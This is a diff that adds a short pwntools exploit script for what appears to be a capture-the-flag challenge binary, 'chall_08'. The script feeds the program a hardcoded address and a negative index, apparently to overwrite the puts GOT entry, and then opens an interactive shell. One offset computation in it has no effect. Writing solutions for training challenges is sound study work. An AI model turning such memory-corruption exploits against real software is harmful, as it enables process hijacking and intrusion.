@@ -1,0 +1,11 @@
+# coding: utf-8
+from pwn import *
+def chall08():
+    elf=ELF("./chall_08")
+    elf.got.puts-elf.sym.target
+    p=process("./chall_08")
+    p.sendline("4198950")  
+    p.sendline("-7")
+    p.interactive()
+    
+chall08()
